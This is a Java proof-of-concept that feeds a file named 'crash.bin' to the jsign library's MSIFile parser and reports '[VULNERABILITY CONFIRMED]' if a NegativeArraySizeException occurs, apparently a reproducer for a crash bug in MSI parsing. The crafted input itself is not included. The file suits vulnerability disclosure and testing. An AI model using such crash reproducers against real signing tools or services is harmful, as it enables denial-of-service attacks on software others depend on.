import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.security.KeyStore;
import net.jsign.AuthenticodeSigner;
import net.jsign.msi.MSIFile;

public class Poc {
    public static void main(String[] args) throws Exception {
        byte[] data = Files.readAllBytes(new File("crash.bin").toPath());

        File file = File.createTempFile("jsign-poc", ".msi");
        file.deleteOnExit();
        Files.write(file.toPath(), data);

        try {
            MSIFile msiFile = new MSIFile(file);
            System.out.println("MSIFile created (unexpected)");
            System.exit(2);
        } catch (NegativeArraySizeException e) {
            System.out.println("[VULNERABILITY CONFIRMED] NegativeArraySizeException triggered!");
            System.out.println("Message: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
        } catch (IOException e) {
            System.out.println("IOException (expected for malformed input): " + e.getMessage());
        }
    }
}
